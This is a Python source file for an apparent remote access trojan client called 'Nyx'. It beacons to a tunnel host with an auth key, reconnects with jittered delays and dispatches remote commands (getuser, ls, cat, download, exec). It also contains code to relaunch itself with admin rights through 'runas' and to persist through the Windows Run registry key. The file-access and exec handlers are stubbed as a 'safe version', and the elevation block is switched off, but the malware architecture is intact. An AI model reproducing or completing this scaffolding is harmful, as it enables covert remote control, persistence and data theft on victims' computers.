import getpass
import socket
import random
import time
import struct
import subprocess
import platform
import winreg
import sys
import os
import urllib.request

if False:
    try:
        import ctypes
        if ctypes.windll.shell32.IsUserAnAdmin() == 0:
            if getattr(sys, "frozen", False):
                args = sys.argv
            else:
                args = [os.path.abspath(__file__)] + sys.argv[1:]
            cmd = " ".join(f'"{a}"' if " " in str(a) else str(a) for a in args)
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, cmd, None, 1)
            sys.exit(0)
    except Exception:
        pass

TUNNEL_HOST = "127.0.0.1"
PORT_URL = ""
TUNNEL_PORT = 5050
KEY = "Nyx"

def get_tunnel_port():
    if PORT_URL:
        try:
            with urllib.request.urlopen(PORT_URL, timeout=10) as r:
                return int(r.read().decode().strip())
        except Exception:
            pass
    return TUNNEL_PORT


def send(msg):
    s.send(msg.encode("UTF-8"))


def add_to_startup():
    if getattr(sys, "frozen", False):
        exe_path = sys.executable
    else:
        exe_path = f'"{sys.executable}" "{os.path.abspath(__file__)}"'
    key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        0,
        winreg.KEY_SET_VALUE,
    )
    winreg.CloseKey(key)


def get_command():
    while True:
        try:
            msg = s.recv(4096)
        except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError, OSError):
            break
        if not msg:
            break
        cmd = msg.decode("UTF-8")
        try:
            if cmd == "test":
                send("[OK]")
            elif cmd == "getuser":
                s.send(getpass.getuser().encode())
            elif cmd == "shutdown":
                s.shutdown(socket.SHUT_RDWR)
                s.close()
                break
            elif cmd == "platform":
                send(platform.system())
            elif cmd == "ls":
                send("DIR (safe version, listing disabled)")
            elif cmd.startswith("cd "):
                send("DIR (safe version)")
            elif cmd.startswith("cat "):
                send("(safe version)")
            elif cmd.startswith("download "):
                s.sendall(b"FILE safe 0\n")
            elif cmd.startswith("exec "):
                send("(safe version - exec disabled)")
            else:
                send("[?]")
        except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError, OSError):
            break
        except Exception:
            pass
    try:
        s.shutdown(socket.SHUT_RDWR)
    except Exception:
        pass
    try:
        s.close()
    except Exception:
        pass


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack("ii", 1, 0))
except Exception:
    pass

connected = False
while not connected:
    try:
        port = get_tunnel_port()
        s.connect((TUNNEL_HOST, port))
        s.sendall(f"AUTH {KEY}\n".encode("utf-8"))
        connected = True
    except Exception:
        try:
            s.shutdown(socket.SHUT_RDWR)
        except Exception:
            pass
        try:
            s.close()
        except Exception:
            pass
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack("ii", 1, 0))
        except Exception:
            pass
        time.sleep(2)
        time.sleep(random.randint(5, 10))

if os.environ.get("ADD_TO_STARTUP") == "1" or "--startup" in sys.argv:
    add_to_startup()
get_command()
